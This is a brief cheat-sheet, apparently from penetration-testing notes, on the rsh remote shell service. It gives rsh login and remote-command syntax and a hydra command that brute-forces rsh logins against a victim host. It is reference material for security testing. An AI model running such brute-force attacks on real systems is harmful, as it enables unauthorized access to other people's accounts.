## LOGIN
```md
rsh -l username $ip
rsh <IP> <Command>
rsh <IP> -l domain\user <Command>
rsh domain/user@<IP> <Command>
rsh domain\\user@<IP> <Command>
```
## BRUTEFORCE
```md
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```